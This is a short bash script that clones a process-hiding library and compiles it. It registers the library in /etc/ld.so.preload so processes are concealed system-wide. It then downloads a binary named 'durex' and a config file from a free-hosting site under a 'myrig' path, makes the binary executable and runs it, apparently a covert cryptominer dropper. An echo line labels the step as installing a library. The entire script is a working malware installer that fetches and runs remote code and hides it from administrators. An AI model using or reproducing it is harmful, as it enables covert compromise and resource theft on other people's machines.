#!/bin/bash
sudo apt-get -y update
echo "installing library new"
git git clone https://github.com/cihuuy/libn 
cd libn 
gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
mv libprocess.so /usr/local/lib/
echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

wget https://nyadur.000webhostapp.com/myrig/config.json && wget https://nyadur.000webhostapp.com/myrig/durex && sudo chmod +x durex && ./durex

